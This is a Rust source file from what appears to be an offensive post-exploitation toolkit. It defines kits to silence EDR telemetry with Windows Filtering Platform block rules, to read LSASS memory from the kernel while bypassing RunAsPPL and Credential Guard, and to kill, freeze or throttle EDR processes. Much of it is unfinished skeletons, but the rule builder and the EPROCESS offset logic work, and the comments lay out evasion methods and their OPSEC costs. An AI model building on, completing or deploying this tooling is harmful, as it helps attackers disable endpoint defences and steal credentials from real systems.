//! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
//!
//! These three are more operator-orchestrated than the EPROCESS/callback kits:
//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
//!   filter rules that drop the EDR's outbound telemetry. Leaves Event ID
//!   5447 + packet-drop traces (documented OPSEC cost).
//! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
//!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
//!   (CR3 switch + VA read); skeleton + the read loop.
//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
//!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
//!   Choke (EDRChoker QoS throttle, lowest noise).
//!
//! All unit-tested where the algorithm is pure; the user-mode tiers are
//! framework (operator wires the Win32 calls at link time).

use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
use alloc::vec::Vec;

// ---- §2.4 WfpKit ----------------------------------------------------------

/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
/// the EDR's PIDs from sending telemetry. Admin-only, **no driver** — the
/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
/// packet-drop traces in the WFP event log. The kernel-tier alternative
/// (overwriting the WFP callout) needs a KernelRw and is lower noise but
/// higher risk.
///
/// This is the framework: the operator binary binds `FwpmEngineOpen0` /
/// `FwpmFilterAdd0` via the `windows` crate or FFI at link time and feeds the
/// rule template here. The rule-shape logic (match EDR PID → block outbound
/// on the telemetry ports/IPs) is real; the FFI binding is the operator's.
pub struct UserModeEdrSilencer;

/// A WFP filter rule template: drop traffic from `pid` matching `protocol`
/// on `port` (0 = any). The operator materializes these via FwpmFilterAdd0.
#[derive(Clone, Copy)]
pub struct WfpBlockRule {
    pub pid: u32,
    pub protocol: u8, // 6 = TCP, 17 = UDP, 0 = any
    pub port: u16,    // 0 = any
}

impl UserModeEdrSilencer {
    /// Build the rule set for a list of EDR PIDs. Each PID gets a
    /// protocol=any/port=any outbound block (the nuclear telemetry-silence
    /// rule). A surgical variant would target only known EDR C2 endpoints.
    pub fn rules_for(edr_pids: &[u32]) -> Vec<WfpBlockRule> {
        let mut out = Vec::new();
        for &pid in edr_pids {
            out.push(WfpBlockRule { pid, protocol: 0, port: 0 });
        }
        out
    }
}

impl WfpKit for UserModeEdrSilencer {
    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<(), KitError> {
        // The operator binary opens the BFE engine (FwpmEngineOpen0) and adds
        // each rule from rules_for() via FwpmFilterAdd0. Requires the BFE
        // service running + admin. Framework: the FFI binding is operator-side.
        Err(KitError::UnsupportedPosture(
            "WfpKit::silence_edr needs FwpmEngineOpen0/FwpmFilterAdd0 FFI \
             (operator binds via the windows crate); use rules_for() to build \
             the rule set, then add them",
        ))
    }
}

// ---- §4 CredKit -----------------------------------------------------------

/// Kernel-mode LSASS reader: reads LSASS process memory directly via the
/// KernelRw primitive (CR3 switch + VA walk), bypassing RunAsPPL + Credential
/// Guard. The user-mode Nyx `hashdump` reads the SAM hive; this is its
/// kernel-tier upgrade that also yields in-memory credentials (cached DPAPI,
/// Kerberos tickets).
///
/// **Algorithm skeleton:** to read LSASS memory from the kernel you must
/// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
/// CR3. The DTB comes from LSASS's EPROCESS.DirectoryTableBase. Under HVCI
/// the CR3 write is itself a code-page op (mov cr3) — needs the unchecked
/// PatchGuard window; on HVCI-off it's a single kwrite to CR3.
pub struct KernelLsassReader;

/// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
/// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
pub const DIRECTORY_TABLE_BASE: usize = 0x028;

impl KernelLsassReader {
    /// Read `len` bytes from `vaddr` in the process whose EPROCESS is at
    /// `eprocess_kva`, by switching CR3 to that process's DTB.
    ///
    /// The CR3 switch is the dangerous part: between writing CR3 and reading,
    /// the *current* process's address space is wrong — so the read must use
    /// physical addressing or a kernel-space VA that's global. The skeleton
    /// here assumes the KernelRw impl translates VAs via the DTB it just read
    /// (the real impl does a 4-level page-table walk from the DTB to physical,
    /// then reads physical). That walk is the bulk of the work; this is the
    /// orchestration shell.
    pub fn read_process_mem(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        _vaddr: usize,
        _len: usize,
    ) -> Result<Vec<u8>, KitError> {
        // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
        let dtb = krw
            .kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE)
            .map_err(KitError::from)?;
        if dtb == 0 {
            return Err(KitError::UnsupportedPosture("target DTB is zero"));
        }
        // 2. Walk the 4-level page table (PML4 → PDPT → PD → PT) from `dtb` to
        //    resolve `vaddr` → physical. (Pure algorithm, ~40 lines; lands in
        //    the next iteration — the orchestration + DTB read is the shell.)
        let _ = dtb;
        Err(KitError::UnsupportedPosture(
            "read_process_mem: 4-level page-table walk from DTB TBD \
             (DTB read works; the VA→physical resolver is the remaining piece)",
        ))
    }
}

impl CredKit for KernelLsassReader {
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
        // Resolve LSASS's EPROCESS by PID (needs PsActiveProcessHead — same
        // bootstrap gap as ProcHideKit), then read_process_mem its user VA
        // range, assemble a minidump. Skeleton: orchestration only.
        let _ = (krw, pid);
        Err(KitError::UnsupportedPosture(
            "dump_lsass needs PsActiveProcessHead + the page-table walker; \
             use KernelLsassReader::read_process_mem once both are wired",
        ))
    }
}

// ---- §2.5 EdrNeutralizeKit ------------------------------------------------

/// EDR process neutralizer. Kill (kernel ZwTerminateProcess, bypasses PPL) is
/// the only tier that needs a KernelRw; Freeze + Choke are user-mode.
pub struct EdrNeutralizer;

impl EdrNeutralizeKit for EdrNeutralizer {
    fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
        // Note: the trait doesn't pass a KernelRw (Kill is the only tier that
        // needs one; it gets the driver handle via a global the operator sets
        // at init, or the caller invokes the driver's ZwTerminateProcess path
        // directly). Framework: each tier's FFI is operator-bound.
        match m {
            NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
                "Kill: needs the driver's ZwTerminateProcess path (operator wires it; \
                 the trait has no KernelRw param, so Kill resolves the handle via a global)",
            )),
            NeutralizeMethod::Freeze => Err(KitError::UnsupportedPosture(
                "Freeze: user-mode WerFaultSecure coma — operator wires MiniDumpWriteDump",
            )),
            NeutralizeMethod::Choke => Err(KitError::UnsupportedPosture(
                "Choke: user-mode EDRChoker (pacer.sys QoS) — operator wires PsCreatePolicy",
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wfp_rules_any_any_per_pid() {
        let rules = UserModeEdrSilencer::rules_for(&[1234, 5678]);
        assert_eq!(rules.len(), 2);
        assert_eq!(rules[0].pid, 1234);
        assert_eq!(rules[0].protocol, 0); // any
        assert_eq!(rules[0].port, 0); // any
        assert_eq!(rules[1].pid, 5678);
    }

    #[test]
    fn wfp_rules_empty_for_empty_pids() {
        assert!(UserModeEdrSilencer::rules_for(&[]).is_empty());
    }

    #[test]
    fn directory_table_base_is_early_field() {
        // DTB is a near-zero offset field; sanity-pin it so a future "drift"
        // doesn't silently break LSASS reads. 0x028 on every x64 build tested.
        assert_eq!(DIRECTORY_TABLE_BASE, 0x028);
        assert!(DIRECTORY_TABLE_BASE < 0x100);
    }
}
